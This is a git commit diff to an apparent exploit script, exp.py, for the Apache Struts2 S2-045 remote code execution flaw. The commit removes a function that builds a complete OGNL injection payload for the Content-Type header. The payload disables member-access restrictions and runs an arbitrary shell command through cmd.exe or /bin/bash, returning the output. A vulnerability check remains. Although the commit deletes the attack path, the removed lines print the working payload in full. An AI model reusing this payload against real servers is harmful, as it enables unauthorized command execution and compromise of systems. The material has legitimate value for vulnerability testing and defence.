6751916fe8858bae3424458a1483c9722252cebf
cbkyami <166932823+cbkyami@users.noreply.github.com>
2025-07-16 15:23:58 +0800

    Update exp.py

--- S2-045/exp.py
+++ S2-045/exp.py
@@ -16,42 +16,19 @@ def test(url):
         return res
     except:
         return
-    
-def p(url, cmd):
-    payload = "%{(#_='multipart/form-data')."
-    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
-    payload += "(#_memberAccess?"
-    payload += "(#_memberAccess=#dm):"
-    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
-    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
-    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
-    payload += "(#ognlUtil.getExcludedClasses().clear())."
-    payload += "(#context.setMemberAccess(#dm))))."
-    payload += "(#cmd='%s')." % cmd
-    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
-    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
-    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
-    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
-    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
-    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
-    payload += "(#ros.flush())}"
-    headers['Content-Type'] = payload
-    try:
-        res = requests.post(url,headers=headers,timeout=5).text
-        return res
-    except:
-        return 
+
 
 if sys.argv[1]:
-    url = f'http://{sys.argv[1]}'
+    if "http" in sys.argv[1]:
+        url = sys.argv[1]
+    else:
+        url = f'http://{sys.argv[1]}'
 
 if len(sys.argv) == 2:
     num = test(url)
     if '54289' == num['s2-045']:
         print("[*] checking s2-045 ...")
         print("[*] vul Exists!!!")
-elif len(sys.argv) == 3:
-    print(p(url,sys.argv[2]))
 else:
     print("[-] argv error!!")
     print('[+] usage url [cmd]')
